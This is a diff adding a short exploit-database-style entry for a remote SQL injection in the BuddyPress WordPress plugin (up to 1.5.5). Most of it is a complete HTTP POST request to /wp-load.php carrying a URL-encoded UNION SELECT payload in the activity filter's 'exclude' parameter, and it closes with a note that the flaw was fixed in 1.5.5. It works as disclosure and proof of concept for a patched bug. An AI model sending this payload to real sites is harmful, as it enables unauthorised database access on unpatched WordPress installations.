@@ -1,0 +1,22 @@
+# Exploit Title: Buddypress plugin of Wordpress remote SQL Injection
+# Date: March 31, 2012
+# Author: Ivan Terkin
+# Exploitation: Remote Exploit
+# Bug: Remote SQL Injection
+# Software Link: buddypress.org
+# Version: till 1.5.5
+# Tested on: Buddypress 1.5.4
+
+
+POST /wp-load.php HTTP/1.1
+User-Agent: Mozilla
+Host: example.com
+Accept: */*
+Referer: http://example.com/activity/?s=b
+Connection: Keep-Alive
+Content-Length: 153
+Content-Type: application/x-www-form-urlencoded
+
+action=activity_widget_filter&page=1%26exclude%3d1)and(1=0)UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17))%3b--+
+
+Reported to developers and fixed in version 1.5.5
